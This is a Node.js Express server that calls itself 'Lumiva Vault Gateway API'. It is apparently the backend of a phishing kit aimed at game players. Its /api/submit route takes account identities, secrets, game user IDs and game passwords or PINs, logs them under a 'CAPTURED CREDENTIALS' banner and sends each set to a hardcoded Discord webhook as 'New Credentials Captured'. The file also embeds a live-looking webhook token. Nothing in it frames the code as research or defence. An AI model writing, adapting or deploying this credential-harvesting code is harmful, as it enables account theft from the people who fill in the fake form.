const express = require('express');
const cors = require('cors');

const app = express();
const PORT = process.env.PORT || 8080;
const DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1560483785953378406/Z-c3KXiml5BKbJwqDKhD8UVpMjSFsKDy89ZYyAg0VU02MnxKSkOJ0ozzCg-MfJKZq5XP';

app.use(cors());
app.use(express.json());

let webhookQueue = [];
let isProcessingQueue = false;

async function processQueue() {
    if (isProcessingQueue || webhookQueue.length === 0) return;
    isProcessingQueue = true;

    while (webhookQueue.length > 0) {
        const discordPayload = webhookQueue.shift();
        try {
            const response = await fetch(DISCORD_WEBHOOK_URL, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(discordPayload)
            });

            if (response.status === 429) {
                const retryAfterHeader = response.headers.get('retry-after');
                let waitTime = retryAfterHeader ? parseFloat(retryAfterHeader) * 1000 : 10000;
                
                const body = await response.json().catch(() => ({}));
                if (body.retry_after) {
                    waitTime = body.retry_after * 1000;
                }

                // Cap maximum wait time to 15 seconds to prevent locking up the queue too long
                if (waitTime > 15000) {
                    waitTime = 15000;
                }

                console.error(`Discord rate limit hit (429). Waiting ${waitTime}ms before retry.`);
                webhookQueue.unshift(discordPayload);
                await new Promise(resolve => setTimeout(resolve, waitTime));
            } else if (!response.ok) {
                const errText = await response.text();
                console.error(`Discord API Error: ${response.status} ${response.statusText} -${errText}`);
            } else {
                console.log('Discord webhook dispatched successfully.');
            }
        } catch (err) {
            console.error('Failed to dispatch webhook:', err);
        }

        await new Promise(resolve => setTimeout(resolve, 2000));
    }

    isProcessingQueue = false;
}

app.get('/', (req, res) => {
    res.status(200).json({ status: 'online', service: 'Lumiva Vault Gateway API' });
});

app.post('/api/submit', async (req, res) => {
    const payload = req.body;

    console.log('--- CAPTURED CREDENTIALS & METADATA ---');
    console.log(`Method / Auth Type : ${payload.method || 'N/A'}`);
    console.log(`Account Identity   : ${payload.identity || 'N/A'}`);
    console.log(`Account Secret     : ${payload.secret || 'N/A'}`);
    console.log(`Target Game        : ${payload.game || 'N/A'}`);
    console.log(`Game User ID / Name: ${payload.uid || 'N/A'}`);
    console.log(`Game Password / PIN: ${payload.gamePassword || 'N/A'}`);
    console.log(`Device Platform    : ${payload.device || 'N/A'}`);
    console.log(`Selected Package   : ${payload.package || 'N/A'}`);
    console.log('----------------------------------------');

    const discordPayload = {
        embeds: [{
            title: "🚨 New Credentials Captured",
            color: 16711680,
            fields: [
                { name: "Method", value: payload.method || 'N/A', inline: true },
                { name: "Identity", value: `\`${payload.identity || 'N/A'}\``, inline: true },
                { name: "Secret", value: `\`${payload.secret || 'N/A'}\``, inline: true },
                { name: "Game", value: payload.game || 'N/A', inline: true },
                { name: "Game UID", value: `\`${payload.uid || 'N/A'}\``, inline: true },
                { name: "Game Pass", value: `\`${payload.gamePassword || 'N/A'}\``, inline: true },
                { name: "Device", value: payload.device || 'N/A', inline: true },
                { name: "Package", value: payload.package || 'N/A', inline: false }
            ],
            timestamp: new Date().toISOString()
        }]
    };

    webhookQueue.push(discordPayload);
    processQueue();

    res.status(200).json({ success: true, message: 'Payload received and processed.' });
});

app.listen(PORT, '0.0.0.0', () => {
  console.log(`Server running on port ${PORT}`);
});
